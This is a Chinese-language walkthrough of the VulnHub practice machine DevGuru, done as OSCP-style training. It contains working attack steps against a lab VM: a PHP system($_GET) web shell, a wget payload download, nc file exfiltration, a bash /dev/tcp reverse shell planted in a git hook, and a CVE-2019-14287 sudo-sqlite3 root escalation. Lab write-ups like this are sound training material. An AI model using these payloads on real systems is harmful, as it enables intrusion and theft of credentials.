# Devguru Writeup
> URL : https://www.vulnhub.com/entry/devguru-1,620/

IP : 192.168.1.138

覺得打 Tryhackme 也一陣子了，可以回來打打看 VulnHub 的 OSCP 模擬題試試水溫，不過看樣子打起來還是有一點辛苦QQQ


## 部屬機器
- 載下來解壓縮後，是虛擬盒子的 OVA，開虛擬盒子，網路改橋接試試看
	- ![](https://i.imgur.com/yU9l1ry.png)
- 很棒，這台機器自動的告訴我們 IP 惹，不需要用奇怪的方法來找 IP


## Recon
- 先掃 Port
	- `rustscan -a 192.168.1.138`
		- ![](https://i.imgur.com/LY4dImU.png)
		- 發現有開 22,80,8585
	- `nmap -A -p22,80,8585 192.168.1.138`
		- 用 nmap 大致掃一下
- `python3 dirsearch.py -u http://192.168.1.138/`
	- 用 Dirsearch 掃描，觀察看看有沒有什麼有趣ㄉ東西
	- ![](https://i.imgur.com/gtOQyIo.png)
	- 發現他的 `.git` 竟然存在，可以嘗試用 Githack 把資料復原
	- 還有一個 `adminer` 是類似 PHP My Admin 的東西
- 觀察 80 port
	- ![](https://i.imgur.com/j1gFhRt.png)
	- 是一個叫做 October 的 CMS 
	- 而 `Adminer` 版本是 4.7.7
- 觀察 8080 port
	- 是一個 Gitea 版本是 1.12.5
	- ![](https://i.imgur.com/5dxQLaQ.png)
	- 版本有符合的 Exploit
		- https://www.exploit-db.com/exploits/49571
		- `wget https://www.exploit-db.com/download/49571 -O 49571.py`
		- 發現執行的話需要密碼，所以先放一邊留存
	- ![](https://i.imgur.com/Un2Gf9s.png)
		- 發現一個唯一的使用者叫做 `frank`
		- 他沒有公開的 repo
- Githack
	- `git clone https://github.com/lijiejie/GitHack`
	- `python GitHack.py http://192.168.1.138/.git/`
		- 復原之後覺得裡面的資料滿多的，亂晃一下發現有趣的東西
		- ![](https://i.imgur.com/QImOywF.png)
- 資料庫密碼
	- 帳號 : `october`
	- 密碼 : SQ66EBYx4GT3byXH`
	- 資料庫名稱 `octoberdb`
- 嘗試使用 Adminer 登入
	- http://192.168.1.138/adminer.php
	- ![](https://i.imgur.com/ei7OutK.png)
	- ![](https://i.imgur.com/uF56hGd.png)
		- 發現可以順利登入
## 破解 Hash 成功登入
- 觀察 Backend Users 發現了一組使用者以及密碼 hash
	- ![](https://i.imgur.com/61LK9ta.png)
	- 使用者名稱 : `frank`
	- 密碼 Hash : `$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK
`
- 觀察網站
	- http://192.168.1.138/backend/backend/auth/signin
	- 使用 `frank` 做為帳號登入
	- 但我們需要知道密碼是什麼 QQQ
- 暴力破解?
	- `john frank.txt --wordlist=rockyou.txt`
	- 在我家的超級電腦跑了 10 分鐘也沒有結果，看起來應該不是
	- ![](https://i.imgur.com/q3LGq1D.png)
- 這到底是什麼 hash?
	- 使用這個網站 https://www.tunnelsup.com/hash-analyzer/
	- 貼上 hash 值
		- `$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK`
	- 可以自動分析出他叫做 `bcrypt`
	- ![](https://i.imgur.com/u3aWPHT.png)
- 我們可以尋找 bcrypt 的產生器，幫我們產出一組符合規格的 hash
	- https://bcrypt-generator.com/
	- 我們隨便輸入一組密碼
	- `meowmeow12345`
		- 他就產出惹
			- `$2a$12$LnBY8Lzpcq1/Z90x41QZT.fkJKfcWvFtYzQc9Ex4vzAHSvFLn6.Ce`
	- 但登入卻一直噴錯 QQ
	- 繼續挖 DB 會發現帳號被 suspend 了QQ
	- 那我們就直接把這一筆刪掉ㄅ !!
	- ![](https://i.imgur.com/2T2VvTU.png)

- 另外還觀察到使用者的 DB 裡面有一組 persist_code
	- 暫時不知道是幹嘛的，先存下來備用
	- `$2y$10$hnhKQ8hTe9b3SoZgXhBuT.HG17VvEdBXe86hEq1qdIknkcM1rbxYi`
- 順利登入 CMS
	- 想試試看在上傳檔案的地方上傳 webshell
	- 或是透過修改檔名之類的方法先傳 .txt 再改 .php 都失敗
	- ![](https://i.imgur.com/9RDaQBc.png)
- SSTI
	- 在 CMS 的 Assets 地方發現可以 SSTI
	- ![](https://i.imgur.com/SRSocAR.png)
	- ![](https://i.imgur.com/AmiKy79.png)
	- ![](https://i.imgur.com/LuVKN0w.png)
	- 輸入錯誤的資料會爛掉
		- ![](https://i.imgur.com/OxxIjH5.png)
		- 從 Debug 頁面可以看出他是使用 `TWIG` 做為模板引擎
	- ![](https://i.imgur.com/g94JVY1.png)
	- 嘗試使用一些測試的 Payload
	- 但大多數都失敗 QQ
- 插入 Command
	- 在 October CMS 上，可以看到
	- https://octobercms.com/docs/cms/pages
	- 可以直接插入 Code
	```php
	function onStart()
	{
	system($_GET['A']);
	}
	```
	- ![](https://i.imgur.com/mQPbbei.png)
	- 然後就成功ㄌ!
	- ![](https://i.imgur.com/KvAUDOZ.png)
## 進入系統
- 嘗試用 Command 載 reverse shell
	- `192.168.1.138/?A=wget 192.168.1.106:8000/s_l -O /tmp/s`
	- ![](https://i.imgur.com/TiE2BOj.png)
- 戳 Reverse shell
	- `nc -nvlp 7877`
	- ![](https://i.imgur.com/C1Uw9co.png)
	- 成功!
- LinPeas
	- `wget 192.168.1.106:8000/linpeas.sh`
		- ![](https://i.imgur.com/wbZiNqv.png)
	- `bash linpeas.sh`
		- 找到可能有用的密碼!!
		- ![](https://i.imgur.com/xlR0Ql4.png)
- 把密碼檔案用 `nc` 傳出來
	- `nc -l -p 1234 > meow`
	- `nc 192.168.1.106 1234 < app.ini.bak`
	- config 資料
		- NAME : `gitea`
		- USER : `gitea`
		- PASSWD : `UfFPTF8C8jjxVF2m`
	- ![](https://i.imgur.com/bIPUmdB.png)
## 登入 Gitea
- 登入 SQL 觀察使用者
	- ![](https://i.imgur.com/AWlubpW.png)
	- 發現是一種 `pbkdf2` 的 hash 演算法
		- hash :`c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900`
		- salt :`Bop8nwtUiM`
		- `passwd_hash_algo` : argon2
	- 觀察 hash 長度
		- `len("c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900")`
		- ![](https://i.imgur.com/6mtMOfT.png)
		- 長度是 400 bits = 50 Bytes
- Google 到 pbkdf2 的產生器產密碼
	- https://neurotechnics.com/tools/pbkdf2-test
	- ![](https://i.imgur.com/cQ4slf7.png)
	- 但後來登入都失敗了 QQ
- 去 Github 上搜尋 `passwd_hash_algo` 找到了別人現成的 hash
	- ![](https://i.imgur.com/lmsUiO9.png)
		- https://github.com/go-gitea/gitea/blob/22a0636544237bcffb46b36b593a501e77ae02cc/models/fixtures/user.yml
	- passwd:` a3d5fcd92bae586c2e3dbe72daea7a0d27833a8d0227aa1704f4bbd775c1f3b03535b76dd93b0d4d8d22a519dca47df1547b # password`
		- 該 hash 值 就是 `password`
	- salt: `ZogKvWdyEx`
	- passwd_hash_algo: `argon2`
 	- 把他們填進去 SQL 中
- http://192.168.1.138:8585/user/login?redirect_to=
	- ![](https://i.imgur.com/mqIcmOO.png)
	- frank / password
	- 嘗試登入，就登入成功ㄌ!

- 使用剛剛前面載的 Exploit
	- https://www.exploit-db.com/exploits/49571
	- `nc -nvlp 7879`
	- `python3 49571.py -t http://192.168.1.138:8585 -u frank -p password -I 192.168.1.106 -P 7879`
	- 但都打不進去 QQ
		- ![](https://i.imgur.com/CAMq6fh.png)
- 觀察使用者的 Git
	- 觀察到他有用 githook 做 CI/CD
		- ![](https://i.imgur.com/lngoWRe.png)
	- 所以可以試著在這邊 bash 上加 reverse shell 
		- `bash -c 'bash -i >& /dev/tcp/192.168.1.106/7879 0>&1'`
		- ![](https://i.imgur.com/GNC9HTR.png)
		- 改完之後會發現 update 亮綠燈
			- ![](https://i.imgur.com/5JbCMlE.png)
	- 接著來亂改他的 `readme.md` 、發 Commit
		- ![](https://i.imgur.com/WSLMrNk.png)
	- ![](https://i.imgur.com/NFHxsgn.png)
	- 成功拿到使用者的 Shell!
	
## 提權
- `sudo -l` 觀察
	- ![](https://i.imgur.com/I3mkYEc.png)
	- 發現我們可以用 `sudo` 執行 sqlite3
- 再跑一次 Linpeas
	- ![](https://i.imgur.com/GvgtkCZ.png)
	- ![](https://i.imgur.com/NP57ciG.png)
	- 看起來沒什麼特別，但我們可以注意 sudo 版本 
- `sudo -V`
	- ![](https://i.imgur.com/zGxlAj5.png)
	- 發現是 `1.8.21p2` 版本
		- `CVE-2019-14287`
		- 可以用 `sudo -u#-1 binary` 來繞密碼
- GTFOBins 可以找到 SQLite3 的 sudo 利用方法
	- https://gtfobins.github.io/gtfobins/sqlite3/#sudo
	- 串成完整的 Payload
		- `sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/sh'`
	- 執行!!
		- ![](https://i.imgur.com/9p9M2K8.png)
- 取得Root Flag
	- ![](https://i.imgur.com/Q25ze6p.png)
